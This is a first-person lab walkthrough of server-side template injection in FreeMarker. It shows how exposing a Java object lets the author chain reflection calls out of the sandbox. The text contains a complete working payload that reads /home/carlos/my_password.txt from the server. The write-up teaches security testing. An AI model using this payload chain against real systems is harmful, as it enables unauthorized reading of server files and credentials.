# Walkthrough — Server-Side Template Injection in FreeMarker with a Sandbox Escape

## 1. Identify the Template Injection

The lab allows editing a product description template.

I first tested whether the template engine evaluates expressions:

```text
${product}
```

The application returned the `product` object, confirming that the object was accessible from the FreeMarker template.

## 2. Identify the Object's Java Class

I then tested:

```text
${product.getClass()}
```

The application returned:

```text
class lab.actions.templateengines.FreeMarkerProduct
```

This showed that Java methods could be called on the object.

Instead of guessing a complete payload, I followed the methods available through the Java object.

## 3. Build the Method Chain

I followed this chain:

```text
product
  ↓
getClass()
  ↓
getProtectionDomain()
  ↓
getCodeSource()
  ↓
getLocation()
```

The important payload was:

```text
${product.getClass().getProtectionDomain().getCodeSource().getLocation()}
```

I then converted the location to a URI:

```text
.toURI()
```

and used `resolve()` to reference the target file:

```text
.resolve('/home/carlos/my_password.txt')
```

So the chain became:

```text
${product.getClass().getProtectionDomain().getCodeSource().getLocation().toURI().resolve('/home/carlos/my_password.txt')}
```

## 4. Read the File

Next, I converted the URI to a URL and opened the file:

```text
.toURL().openStream()
```

Then I read the file contents:

```text
.readAllBytes()
```

Finally, I used FreeMarker's `?join(" ")` to display the bytes.

The final payload was:

```text
${product.getClass().getProtectionDomain().getCodeSource().getLocation().toURI().resolve('/home/carlos/my_password.txt').toURL().openStream().readAllBytes()?join(" ")}
```

## 5. Retrieve the Password

The payload returned the contents of:

```text
/home/carlos/my_password.txt
```

I copied the returned password and submitted it to complete the lab.

## What I Learned

The important part of this lab was not memorizing the final payload.

The useful approach was:

```text
Find an accessible object
        ↓
Find its Java class
        ↓
Find accessible methods
        ↓
Follow the returned object types
        ↓
Reach Java functionality outside the intended sandbox
        ↓
Access the target file
```

The key discovery was:

```text
${product.getClass()}
```

Once I confirmed that Java methods could be invoked, I could build the rest of the payload by following the Java API rather than blindly guessing.

**Main takeaway:** when exploiting SSTI, understand what objects are exposed and what methods they provide. The final payload is usually the result of chaining those objects and methods together.
